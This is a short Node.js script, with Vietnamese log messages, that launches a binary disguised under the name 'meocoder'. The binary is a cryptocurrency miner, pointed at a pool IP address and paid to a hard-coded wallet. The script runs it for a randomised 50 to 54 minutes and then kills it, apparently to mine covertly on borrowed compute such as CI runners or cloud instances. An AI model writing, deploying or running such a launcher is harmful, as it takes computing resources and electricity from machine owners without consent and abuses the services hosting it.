const shell = require('shelljs');
const { printLog } = require('./log-print');

const timeout = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const timeRunJobs = ((Math.floor(Math.random() * 5) + 50) * 60) * 1000;
console.log(`-- task chay trong ${((timeRunJobs / 60) / 1000)} phut`);

(async () => {
  await timeout(timeRunJobs);
    if (shell.exec('killall meocoder && pkill meocoder', { silent: true }).code === 0) {
        console.log('-- ket thuc jobs thanh cong');
    } else {
        console.log('-- ket thuc jobs that bai');
    }
})();


const runMonney = shell.exec(`./meocoder -o 168.62.177.218:8080 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder_linux -k`, { silent: true, async: true });
if (runMonney.code !== undefined) {
    return 0;
}
console.log('task running');
runMonney.stdout.on('data', (rawLog) => {
    printLog(rawLog);
});
